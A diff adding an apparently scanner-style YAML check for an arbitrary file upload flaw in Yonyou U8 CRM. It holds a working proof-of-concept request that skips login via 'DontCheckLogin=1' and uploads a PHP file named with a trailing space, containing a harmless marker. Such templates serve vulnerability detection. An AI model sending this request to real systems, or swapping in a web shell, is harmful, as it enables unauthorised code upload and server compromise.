@@ -1,0 +1,33 @@
+id:
+
+info:
+  name: 用友U8 CRM swfupload 任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /ajax/swfupload.php?DontCheckLogin=1&vname=file
+  headers:
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data;boundary=----269520967239406871642430066855
+  data: |
+    ------269520967239406871642430066855
+    Content-Disposition: form-data; name="file"; filename="s.php "
+    Content-Type: application/octet-stream
+      
+    12345
+    ------269520967239406871642430066855
+    Content-Disposition: form-data; name="upload"
+  
+    upload
+    ------269520967239406871642430066855--
+response1:
+  headers:
+  body: tmp_name
+  code: 200
+requests2:
+response2:
